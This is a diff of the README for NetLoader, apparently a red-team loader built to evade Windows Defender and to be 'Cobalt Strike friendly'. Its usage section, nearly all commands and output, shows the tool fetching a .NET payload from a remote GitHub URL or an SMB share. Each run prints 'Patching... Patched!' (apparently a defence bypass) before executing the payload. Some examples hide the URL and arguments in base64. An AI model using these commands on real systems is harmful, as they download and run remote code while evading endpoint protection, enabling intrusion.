@@ -22,15 +22,42 @@ Changed because Defender added some signatures related to VS ressources.
 
 # Usage
 Deploy from remote URI
-![Minimalistic input](https://github.com/Flangvik/NetLoader/raw/master/Screenshots/MinimalInput.JPG)
+
+	PS D:\NetLoader> .\NetLoader.exe https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin whoami
+	[!] ~Flangvik  #NetLoader
+	[+] Patching...
+	[+] Patched!
+	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
+	desktop-oaa0hhf\flangvik
+
 
 Deploy from local path or SMB share, note that NetLoader detects whether the input path is local or remote)
-![Minimalistic local input](https://github.com/Flangvik/NetLoader/raw/master/Screenshots/MinimalInputlocal.JPG)
 
-Support base64 inputs for those long strings that usually would break stuff!
+	.\NetLoader.exe --path D:\Tools\Stracciatella.bin --args whoami
+	[!] ~Flangvik  #NetLoader
+	[+] Patching...
+	[+] Patched!
+	[+] Starting D:\Tools\Stracciatella.bin with args whoami
+	desktop-oaa0hhf\flangvik
 
-![Base64 encoded input,  minimalistic](https://github.com/Flangvik/NetLoader/raw/master/Screenshots/MinimalInputb64.JPG)
-![Base64 encoded input](https://github.com/Flangvik/NetLoader/raw/master/Screenshots/Inputb64.JPG)
+
+Supports base64 inputs for those long strings that usually would break stuff!
+
+	PS D:\NetLoader> .\NetLoader.exe b64 aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu d2hvYW1p
+	[!] ~Flangvik  #NetLoader
+	[+] Patching...
+	[+] Patched!
+	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
+	desktop-oaa0hhf\flangvik
+	PS D:\NetLoader>
+
+
+	PS D:\NetLoader> .\NetLoader.exe --b64 --path aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu --args d2hvYW1p
+	[!] ~Flangvik  #NetLoader
+	[+] Patching...
+	[+] Patched!
+	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
+	desktop-oaa0hhf\flangvik
 
 Should be Cobalt Strike friendly ! :) 
 
